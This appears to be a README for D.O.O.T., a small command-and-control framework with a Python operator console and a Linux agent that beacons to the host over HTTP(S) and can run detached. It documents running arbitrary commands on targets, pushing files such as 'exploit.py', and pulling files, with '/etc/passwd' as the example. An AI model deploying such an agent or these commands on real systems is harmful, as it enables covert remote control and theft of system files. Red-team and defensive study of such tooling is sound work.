# D.O.O.T. (Dropping Ordinance On Target)

A simple, Python-based framework for executing commands and moving files to remote agents gracefully.

## Components

- `host/doot_host.py`: The central host API and operator console.
- `target/linux_agent.sh`: The target system agent that polls the host over HTTP(S).

## Usage

### Server
Start the host server listening on an interface and port.
```bash
python3 doot_host.py --bind 0.0.0.0 --port 8443
```

### Agent
Run the installation script on the remote target to connect back to the host server. 
It accepts the host URL. The script will automatically sleep a random interval between 1 and 10 seconds between polls.

To run it normally (blocks the terminal):
```bash
./linux_agent.sh https://<host-ip>:8443
```

To run it silently in the background (detached):
```bash
./linux_agent.sh https://<host-ip>:8443 --detached
```

## Operator Commands
Once an agent connects, interact with the target using the `doot>` REPL inside the Python host script.

- `help`: Print out available commands.
- `sessions`: List all connected agents, their OS, and how long ago they last checked in.
- `ls [session_id] [path]`: List the directory contents on the target machine.
  - Omit `session_id` to run `ls` on the most recently active session.
  - Omit `path` to view the target's current working directory.
  - Example: `ls /etc` (Runs `ls -la /etc` on the newest session).
- `cmd [session_id] <command>`: Execute an arbitrary command on the target and capture its output.
  - Omit `session_id` to execute on the most recently active session.
  - Provide any shell command string. If there is no output, a message will confirm execution.
  - Example: `cmd id` (Runs `id` on the newest session and returns the stdout/stderr output).
  - Example: `cmd h4x-1234 sleep 5` (Runs `sleep 5` on a specific session).
- `push [session_id] <local_src> [remote_dst]`: Transfer a local file to the target.
  - Omit `session_id` to push to the most recently active session.
  - Omit `remote_dst` to drop the file in the target's current directory using the source filename.
  - Example: `push exploit.py` (Pushes `exploit.py` to target).
- `pull [session_id] <remote_src> [local_dst]`: Transfer a file from the target download.
  - Omit `session_id` to pull from the most recently active session.
  - Omit `local_dst` to download the file to the host's current directory using the remote filename.
  - Example: `pull /etc/passwd` (Pulls `/etc/passwd` and drops it as `passwd` on the host).
- `generate-cert`: Generates a fully self-signed `server.crt` and `server.key` for D.O.O.T to automatically enable HTTPS encryption. 
- `quit` or `exit`: Safely shut down the central server and exit the REPL.
